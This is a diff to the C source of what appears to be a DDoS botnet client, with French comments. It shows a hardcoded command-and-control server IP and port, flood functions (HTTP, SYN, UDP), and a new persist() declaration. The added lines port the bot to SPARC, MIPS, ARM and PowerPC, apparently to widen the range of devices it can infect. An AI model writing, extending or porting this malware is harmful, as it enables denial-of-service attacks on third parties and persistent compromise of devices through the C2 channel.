@@ -3,6 +3,28 @@
 #define _DEFAULT_SOURCE
 #define __USE_GNU
 
+/* Contournement pour les problèmes de asm/socket.h */
+#ifdef __SPARC__
+#define __ASM_SPARC_SOCKET_H
+#endif
+
+#ifdef __MIPS__
+#define __ASM_MIPS_SOCKET_H
+#endif
+
+#ifdef __ARM__
+#define __ASM_ARM_SOCKET_H
+#endif
+
+#ifdef __PPC__
+#define __ASM_POWERPC_SOCKET_H
+#endif
+
+/* Définitions de socket manquantes pour certaines architectures */
+#ifndef SOCK_NONBLOCK
+#define SOCK_NONBLOCK 0
+#endif
+
 /* Configuration */
 #define BUFFER_SIZE 1024
 #define MAX_PACKET_SIZE (5 * 1024 * 1024)  // 5MB max
@@ -30,18 +52,35 @@
 
 /* Headers optionnels (si disponibles) */
 #ifdef __linux__
+#ifndef __SPARC__
 #include <netinet/ip.h>
 #include <netinet/tcp.h>
 #include <netinet/udp.h>
 #endif
+#endif
+
+/* Structures et constantes manquantes pour certaines architectures */
+#ifndef IPPROTO_TCP
+#define IPPROTO_TCP 6
+#endif
+
+#ifndef IPPROTO_UDP
+#define IPPROTO_UDP 17
+#endif
+
+#ifndef IPPROTO_ICMP
+#define IPPROTO_ICMP 1
+#endif
 
 #include <dirent.h>
+#include <ctype.h>
 
 // Déclarations des fonctions
 void ddos_attack(int c2_socket, char* target, int port, int duration, char* method);
 void http_flood(char* target, int port, int duration);
 void syn_flood(char* target, int port, int duration);
 void udp_flood(char* target, int port, int duration);
+void persist(void);
 
 #define C2_SERVER "51.68.128.169"
 #define C2_PORT 1337
@@ -731,7 +770,7 @@ void ddos_attack(int c2_socket, char* target, int port, int duration, char* meth
                     
                     // Générer des paramètres aléatoires
                     char params[128];
-                    snprintf(params, sizeof(params), "?id=%d&page=%d&t=%ld", rand(), rand() % 100, time(NULL));
+                    snprintf(params, sizeof(params), "?id=%d&page=%d&t=%ld", rand(), rand() % 100, (long)time(NULL));
                     
                     // Construire la requête avec des variations
                     char request[BUFFER_SIZE];
